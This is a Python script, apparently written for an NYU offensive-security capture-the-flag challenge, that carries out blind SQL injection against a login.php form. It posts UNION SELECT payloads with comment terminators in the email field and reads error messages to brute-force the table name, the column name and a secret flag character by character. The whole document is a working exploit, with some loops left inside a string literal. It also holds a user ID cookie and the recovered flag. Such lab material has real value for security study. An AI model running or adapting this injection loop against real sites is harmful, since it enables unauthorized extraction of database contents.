import requests


url = 'http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php'

headers = {'Host': 'offsec-chalbroker.osiris.cyber.nyu.edu:1241',
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0',
            'Referer': 'http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': 'CHALBROKER_USER_ID=jd3846',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'}

"""
payload = {"email": "' UNION SELECT table_name,1,1 FROM information_schema.tables WHERE table_name LIKE '" + brute + "%'; -- asdf", "password": "' -- asdf"}
r = requests.post(url, headers = headers, data=payload)
print(r.status_code, r.reason)
print(r.content)


#BRUTES TABLE NAME
#brute = 'secrets'

active = True
i = 32 #126 max
while active:
    if i == 126:
        active = False

    payload = {"email": "' UNION SELECT table_name,1,1 FROM information_schema.tables WHERE table_name LIKE '" + brute + "%'; -- asdf", "password": "' -- asdf"}
    r = requests.post(url, headers = headers, data=payload)
    print(r.status_code, r.reason)

    if r.content.find('Fatal error') == -1 and r.content.find('No such user!') == -1:
        print(r.content)
        print("succes")
        print("table name:", brute)
        i = 32
        brute += chr(i)
    else:
        print('na fam')
        print('attempt:', brute)
        brute = brute[:-1]
        i += 1
        if i == 37:
            i = 38
        brute += chr(i)

#BRUTES column name
brute = 'VALUE'
active = True
i = 32 #126 max
while active:
    if i == 126:
        active = False

    payload = {"email": "' UNION SELECT column_name, 1, 1 from information_schema.columns WHERE table_name = 'secrets' AND column_name LIKE '"+brute+"%'; -- asdf", "password": "' -- asdf"}
    r = requests.post(url, headers = headers, data=payload)
    print(r.status_code, r.reason)

    if r.content.find('Fatal error') == -1 and r.content.find('No such user!') == -1:
        print(r.content)
        print("success")
        print("item:", brute)
        i = 32
        brute += chr(i)
    else:
        print('na fam')
        print('attempt:', brute)
        brute = brute[:-1]
        i += 1
        if i == 37:
            i = 38
        if i == 73 and len(brute) == 0:
            i += 1
        brute += chr(i)

print("DONE:", brute)




"""
#BRUTES flag
brute = 'flag{1_R3ALLY_D0NT_HAVE_A_G00D_ID3A_FOR_A_FLAG_AE73138505AF}'
active = True
i = 33 #126 max
while active:
    if i == 126:
        active = False

    payload = {"email": "' UNION SELECT VALUE,1,1 FROM secrets WHERE VALUE LIKE '"+brute+"%'; -- asdf", "password": "' -- asdf"}
    r = requests.post(url, headers = headers, data=payload)
    print(r.status_code, r.reason)

    if r.content.find('Fatal error') == -1 and r.content.find('No such user!') == -1:
        print(r.content)
        print("success")
        print("item:", brute)
        i = 33
        brute += chr(i)
    else:
        print('na fam')
        print('attempt:', brute)
        brute = brute[:-1]
        i += 1
        if i == 37:
            i = 38
        brute += chr(i)

print("DONE:", brute)
"""